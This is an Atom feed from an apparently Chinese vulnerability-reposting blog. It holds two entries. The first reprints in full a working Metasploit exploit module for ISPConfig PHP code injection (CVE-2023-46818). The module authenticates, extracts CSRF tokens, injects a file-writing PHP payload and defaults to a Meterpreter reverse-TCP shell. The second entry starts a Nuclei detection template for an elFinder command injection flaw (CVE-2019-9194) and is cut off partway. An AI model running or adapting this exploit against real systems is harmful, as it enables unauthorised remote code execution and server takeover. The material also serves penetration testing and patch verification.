<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-26T13:15:17.140Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入漏洞</title>
    <link href="http://example.com/2025/06/26/github_457305466/"/>
    <id>http://example.com/2025/06/26/github_457305466/</id>
    <published>2025-06-26T13:15:17.145Z</published>
    <updated>2025-06-26T13:15:17.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 在ISPConfig 3.2.11p1之前的版本中，发现了一个问题。如果admin_allow_langedit被启用，管理员可以通过语言文件编辑器实现PHP代码注入。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>elFinder 命令注入漏洞</title>
    <link href="http://example.com/2025/06/26/github_657581651/"/>
    <id>http://example.com/2025/06/26/github_657581651/</id>
    <published>2025-06-26T12:15:41.694Z</published>
    <updated>2025-06-26T12:15:41.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> elFinder 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-9194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> elFinder在2.1.48之前的版本中，PHP连接器存在命令注入漏洞。当对JPEG文件执行图像操作时，文件名未经适当清理即传递给<code>exiftran</code>实用程序，从而允许命令注入。</p><p><strong>产品厂商：</strong> studio-42</p><p><strong>产品名称：</strong> elFinder</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2.1.47</p><p><strong>搜索语法：</strong> http.title:”elfinder”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/60d108d4b0a55ff98ec04887732a835af6c19830/http%2Fcves%2F2019%2FCVE-2019-9194.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/60d108d4b0a55ff98ec04887732a835af6c19830/http%2Fcves%2F2019%2FCVE-2019-9194.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">9194</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> elFinder <span class="hljs-operator">&lt;=</span> <span class="hljs-number">2.1</span>.<span class="hljs-number">47</span> <span class="hljs-operator">-</span> Command Injection<br>  <span class="hljs-params">author:</span> r00tuser111<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    elFinder before <span class="hljs-number">2.1</span>.<span class="hljs-number">48</span> has a command injection vulnerability <span class="hljs-keyword">in</span> the PHP connector.<br>    The vulnerability occurs when performing image operations on JPEG files, where the filename<br>    is passed to the `exiftran` utility without proper sanitization, allowing command injection.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.exploit-db.com/exploits/46481</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.exploit-db.com<span class="hljs-operator">/</span>exploits<span class="hljs-operator">/</span><span class="hljs-number">46539</span><span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2019-9194</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/cved-sources/cve-2019-9194</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/Studio-42/elFinder/releases/tag/2.1.48</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span 